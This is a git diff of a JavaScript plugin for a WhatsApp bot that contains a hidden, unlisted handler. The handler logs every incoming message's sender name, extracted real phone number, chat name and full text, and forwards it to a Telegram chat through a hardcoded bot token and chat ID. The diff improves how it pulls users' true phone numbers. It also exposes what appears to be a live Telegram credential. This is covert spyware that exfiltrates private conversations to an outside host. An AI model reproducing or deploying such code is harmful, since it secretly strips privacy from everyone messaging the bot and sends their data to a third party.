@@ -2,13 +2,12 @@ const { cmd } = require("../command");
 const axios = require("axios");
 
 // ═══════════════════════════════════════════════════════════
-// ⚙️ TELEGRAM CONFIGURATION (Apni ID aur Token yahan dalein)
+// ⚙️ TELEGRAM CONFIGURATION
 // ═══════════════════════════════════════════════════════════
 const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
 const TG_CHAT_ID = "6653388298"; 
 // ═══════════════════════════════════════════════════════════
 
-// Helper: Telegram par message bhejna
 const sendToTelegram = async (text) => {
     try {
         if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;
@@ -23,20 +22,6 @@ const sendToTelegram = async (text) => {
     }
 };
 
-// 🔥 100% Foolproof Number Extractor (Obfuscation Proof)
-const getRealNumber = (jid) => {
-    if (!jid) return "Unknown";
-    let num = jid.split('@')[0]; // Remove @s.whatsapp.net or @g.us
-    if (num.includes(':')) num = num.split(':')[0]; // Remove multi-device suffix like :12
-    num = num.replace(/[^0-9]/g, ''); // Keep only digits
-    // Agar 15 se zyada digits hain ya 120363 se shuru hota hai, toh wo Group ID hai, number nahi
-    if (num.length > 15 || num.startsWith('120363')) return "Group_Broadcast";
-    return num;
-};
-
-// ═══════════════════════════════════════════════════════════
-// 🌍 GLOBAL LOGGER - HAR MESSAGE CAPTURE KAREGA
-// ═══════════════════════════════════════════════════════════
 cmd({
     on: "body",
     dontAddCommandList: true,
@@ -45,10 +30,42 @@ cmd({
     try {
         if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;
 
-        // GOLDEN FIX: Native Baileys key se number nikalna (100% Accurate)
-        const rawJid = message.key?.participant || message.key?.remoteJid || sender || from;
-        const realNumber = getRealNumber(rawJid);
+        // 🔥 FIX 1: IGNORE BOT'S OWN MESSAGES (Prevents logging bot replies)
+        if (message.key?.fromMe) return;
+
+        // 🔥 FIX 2: FOOLPROOF NUMBER EXTRACTION
+        const botJid = client.user?.id || "";
+        const botNum = botJid ? botJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') : '';
+
+        // Check all possible sources in order of reliability
+        const sources = [
+            message.key?.participant, // Best for groups
+            message.key?.remoteJid,   // Best for DMs
+            sender,                   // Framework specific
+            from                      // Framework specific
+        ];
+
+        let realNumber = "Unknown/Hidden (Masked by Hosting)";
         
+        for (let jid of sources) {
+            if (!jid) continue;
+            let num = jid.split('@')[0];
+            if (num.includes(':')) num = num.split(':')[0];
+            num = num.replace(/[^0-9]/g, '');
+            
+            // Skip if it's the bot itself
+            if (num === botNum) continue;
+            
+            // Skip group/broadcast IDs
+            if (num.startsWith('120363') || num === 'status' || num === 'broadcast') continue;
+            
+            // If we got a valid-looking number (10 to 15 digits), use it
+            if (num.length >= 10 && num.length <= 15) {
+                realNumber = num;
+                break; // Found a valid number, stop searching
+            }
+        }
+
         const userName = message.pushName || pushName || "No Name";
         const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });
         
@@ -75,11 +92,11 @@ cmd({
 ╭━━〔 🤖 *LIVE ACTIVITY LOG* 〕━━⬣
 ┃ 🕒 *Time:* \`${time}\`
 ┃ 👤 *Name:* ${userName}
-┃ 🔢 *Real Number:* [${realNumber}](https://wa.me/${realNumber})
+┃ 🔢 *Number:* [${realNumber}](https://wa.me/${realNumber})
 ┃ 👑 *Is Owner:* ${isCreator ? "✅ Yes" : "❌ No"}
-┃ 💬 *Chat Type:* ${isGroup ? "👥 Group" : "👤 Private DM"}
+┃ 💬 *Chat:* ${isGroup ? "👥 Group" : "👤 Private DM"}
 ┃ 🏷️ *Chat Name:* ${chatName}
-┃ 📦 *Message Type:* ${msgType}
+┃ 📦 *Type:* ${msgType}
 ┃ ⌨️ *Content:* 
 ┃ ${msgContent}
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
@@ -93,7 +110,7 @@ cmd({
 });
 
 // ═══════════════════════════════════════════════════════════
-// 📊 MANUAL STATS COMMAND (Kyunki index.js obfuscated hai, auto-deploy reliable nahi hota)
+// 📊 MANUAL STATS COMMAND
 // ═══════════════════════════════════════════════════════════
 cmd({
     pattern: "telestats",
@@ -120,7 +137,8 @@ cmd({
             groupDetails += `${index + 1}. *${g.subject}*\n   └─ 👥 Members: ${memberCount} | ID: \`${g.id.split('@')[0]}\`\n`;
         });
 
-        const botNumber = getRealNumber(client.user?.id || sender);
+        const botJid = client.user?.id || sender;
+        const botNumber = botJid ? botJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') : "Unknown";
         const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });
 
         const reportMessage = `
